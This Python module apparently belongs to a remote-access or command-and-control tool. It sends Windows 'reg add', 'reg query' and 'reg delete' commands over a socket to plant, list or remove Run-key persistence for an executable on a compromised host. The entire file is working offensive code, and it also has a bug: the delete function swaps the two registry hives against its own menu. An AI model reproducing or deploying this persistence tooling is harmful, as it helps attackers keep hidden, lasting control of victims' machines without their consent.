from printlib import *

def send_data(s, plain_text):
    msg = plain_text + "[END]"
    s.send(msg.encode('utf-8'))
    #s.send(encrypt(msg).encode('utf-8')+b"[END]")
    print_info("Sent:\n"  +plain_text)

def add_reg_persistence(conn):
    ans = print_question("Select Persistence Method:\n1 - HKEY_CURRENT_USER\n2 - HKEY_LOCAL_MACHINE (requires admin)\n")
    key_name = print_question("Name for Key")
    file_location = print_question("EXE Location")
    if ans == "1":
        cmd = r"reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v {k} /t REG_SZ /d {q}{p}{q} /f".format(q='"',k=key_name,p=file_location)
        print_info("Command to Persist Under the Current User (on login):\n{}".format(cmd))
        ans = print_question("Run? [y/n]")
        if ans.lower() == "y":
            send_data(conn, cmd)
            recv_data(conn)

    if ans == "2":
        cmd = r"reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v {k} /t REG_SZ /d {q}{p}{q} /f".format(q='"',k=key_name,p=file_location)
        print_info("Command to Persist (All Accounts on login):\n{}".format(cmd))
        ans = print_question("Run?[y/n]")
        if ans.lower() == "y":
            send_data(conn, cmd)
            recv_data(conn)

def query_reg_persistence(conn):
    print("Queryable Keys:\n1 - HKEY_CURRENT_USER\n2 - HKEY_LOCAL_MACHINE")
    ans = print_question("Which Key")
    if ans == "1":
        cmd = r"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
        print_info("Command to Query:\n{}".format(cmd))
        ans = print_question("Run? [y/n]")
        if ans.lower() == "y":
            send_data(conn, cmd)
            recv_data(conn)
    elif ans == "2":
        cmd = r"reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
        print_info("Command to Query:\n{}".format(cmd))
        ans = print_question("Run? [y/n]")
        if ans.lower() == "y":
            send_data(conn, cmd)
            recv_data(conn)

def delete_reg_persistence(conn):
    print("1 - HKEY_CURRENT_USER\n2 - HKEY_LOCAL_MACHINE")
    hive = print_question("Which hive")
    if hive == "1":
        hive = "HKEY_LOCAL_MACHINE"
    elif hive == "2":
        hive = "HKEY_CURRENT_USER"
    ans = print_question("Enter Key Name to Delete")
    cmd = r"reg delete {h}\Software\Microsoft\Windows\CurrentVersion\Run /v {k} /f".format(k=ans,h=hive)
    print_info("Command to Run:\n{}".format(cmd))
    ans = print_question("Run? [y/n]")
    if ans.lower() == "y":
        send_data(conn, cmd)
        recv_data(conn)

def recv_data(conn):
    data = ""
    while not data.endswith('[END]'):
        recv = conn.recv(128)
        recv_decoded = recv.decode('utf-8')
        data = data + recv_decoded
    print(data.rstrip("[END]"))